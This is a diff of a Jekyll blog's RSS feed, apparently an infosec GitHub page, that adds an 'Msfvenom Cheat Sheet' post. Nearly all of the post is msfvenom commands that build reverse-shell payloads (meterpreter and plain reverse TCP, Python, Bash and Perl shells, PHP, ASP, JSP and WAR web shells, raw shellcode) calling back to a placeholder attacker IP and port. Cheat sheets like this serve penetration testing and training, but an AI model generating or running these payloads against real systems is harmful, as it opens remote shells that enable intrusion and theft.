@@ -1,21 +1,117 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>AADevelopment</title>
-    <description>blog &amp; blog theme🤘</description>
+    <title>InfosecOz</title>
+    <description>InfosecOz GitHub Page</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Mon, 04 Sep 2017 15:54:34 +0930</pubDate>
-    <lastBuildDate>Mon, 04 Sep 2017 15:54:34 +0930</lastBuildDate>
+    <pubDate>Mon, 04 Sep 2017 22:24:37 +0930</pubDate>
+    <lastBuildDate>Mon, 04 Sep 2017 22:24:37 +0930</lastBuildDate>
     <generator>Jekyll v3.5.2</generator>
     
       <item>
-        <title>Generating msfvenom payloads</title>
+        <title>Msfvenom Cheat Sheet</title>
         <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
-  &lt;li&gt;&lt;a href=&quot;#test&quot; id=&quot;markdown-toc-test&quot;&gt;Test&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#binaries&quot; id=&quot;markdown-toc-binaries&quot;&gt;Binaries&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#linux&quot; id=&quot;markdown-toc-linux&quot;&gt;Linux&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#windows&quot; id=&quot;markdown-toc-windows&quot;&gt;Windows&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#macos&quot; id=&quot;markdown-toc-macos&quot;&gt;MacOS&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#web-payloads&quot; id=&quot;markdown-toc-web-payloads&quot;&gt;Web Payloads&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#php&quot; id=&quot;markdown-toc-php&quot;&gt;PHP&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#asp&quot; id=&quot;markdown-toc-asp&quot;&gt;ASP&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#jsp&quot; id=&quot;markdown-toc-jsp&quot;&gt;JSP&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#war&quot; id=&quot;markdown-toc-war&quot;&gt;WAR&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#scripting-payloads&quot; id=&quot;markdown-toc-scripting-payloads&quot;&gt;Scripting Payloads&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#python&quot; id=&quot;markdown-toc-python&quot;&gt;Python&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#bash&quot; id=&quot;markdown-toc-bash&quot;&gt;Bash&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#perl&quot; id=&quot;markdown-toc-perl&quot;&gt;Perl&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#shellcode&quot; id=&quot;markdown-toc-shellcode&quot;&gt;Shellcode&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#linux-based-shellcode&quot; id=&quot;markdown-toc-linux-based-shellcode&quot;&gt;Linux Based Shellcode&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#windows-based-shellcode&quot; id=&quot;markdown-toc-windows-based-shellcode&quot;&gt;Windows Based Shellcode&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#mac-based-shellcode&quot; id=&quot;markdown-toc-mac-based-shellcode&quot;&gt;Mac Based Shellcode&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;h1 id=&quot;test&quot;&gt;Test&lt;/h1&gt;
+&lt;h3 id=&quot;binaries&quot;&gt;Binaries&lt;/h3&gt;
+
+&lt;h4 id=&quot;linux&quot;&gt;Linux&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&amp;lt;Your IP&amp;gt; LPORT=&amp;lt;Your Port&amp;gt; -f elf &amp;gt; shell.elf
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;windows&quot;&gt;Windows&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=&amp;lt;Your IP&amp;gt; LPORT=&amp;lt;Your Port&amp;gt; -f exe &amp;gt; shell.exe
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;macos&quot;&gt;MacOS&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p osx/x86/shell_reverse_tcp LHOST=&amp;lt;Your IP&amp;gt; LPORT=&amp;lt;Your Port&amp;gt; -f macho &amp;gt; shell.macho
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;web-payloads&quot;&gt;Web Payloads&lt;/h3&gt;
+
+&lt;h4 id=&quot;php&quot;&gt;PHP&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p php/meterpreter_reverse_tcp LHOST=&amp;lt;Your IP&amp;gt; LPORT=&amp;lt;Your Port&amp;gt; -f raw &amp;gt; shell.php
+cat shell.php | pbcopy &amp;amp;&amp;amp; echo '&amp;lt;?php ' | tr -d '\n' &amp;gt; shell.php &amp;amp;&amp;amp; pbpaste &amp;gt;&amp;gt; shell.php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;asp&quot;&gt;ASP&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=&amp;lt;Your IP&amp;gt; LPORT=&amp;lt;Your Port&amp;gt; -f asp &amp;gt; shell.asp
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;jsp&quot;&gt;JSP&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p java/jsp_shell_reverse_tcp LHOST=&amp;lt;Your IP&amp;gt; LPORT=&amp;lt;Your Port&amp;gt; -f raw &amp;gt; shell.jsp
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;war&quot;&gt;WAR&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p java/jsp_shell_reverse_tcp LHOST=&amp;lt;Your IP&amp;gt; LPORT=&amp;lt;Your Port&amp;gt; -f war &amp;gt; shell.war
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;scripting-payloads&quot;&gt;Scripting Payloads&lt;/h3&gt;
+
+&lt;h4 id=&quot;python&quot;&gt;Python&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p cmd/unix/reverse_python LHOST=&amp;lt;Your IP&amp;gt; LPORT=&amp;lt;Your Port&amp;gt; -f raw &amp;gt; shell.py
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;bash&quot;&gt;Bash&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p cmd/unix/reverse_bash LHOST=&amp;lt;Your IP&amp;gt; LPORT=&amp;lt;Your Port&amp;gt; -f raw &amp;gt; shell.sh
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;perl&quot;&gt;Perl&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p cmd/unix/reverse_perl LHOST=&amp;lt;Your IP&amp;gt; LPORT=&amp;lt;Your Port&amp;gt; -f raw &amp;gt; shell.pl
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;shellcode&quot;&gt;Shellcode&lt;/h3&gt;
+
+&lt;h4 id=&quot;linux-based-shellcode&quot;&gt;Linux Based Shellcode&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&amp;lt;Your IP&amp;gt; LPORT=&amp;lt;Your Port&amp;gt; -f &amp;lt;language&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;windows-based-shellcode&quot;&gt;Windows Based Shellcode&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=&amp;lt;Your IP&amp;gt; LPORT=&amp;lt;Your Port&amp;gt; -f &amp;lt;language&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h4 id=&quot;mac-based-shellcode&quot;&gt;Mac Based Shellcode&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p osx/x86/shell_reverse_tcp LHOST=&amp;lt;Your IP&amp;gt; LPORT=&amp;lt;Your Port&amp;gt; -fn&amp;lt;language&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
 </description>
         <pubDate>Sun, 03 Sep 2017 00:00:00 +0930</pubDate>
         <link>http://localhost:4000/03/09/2017/msfvenom-payloads/</link>
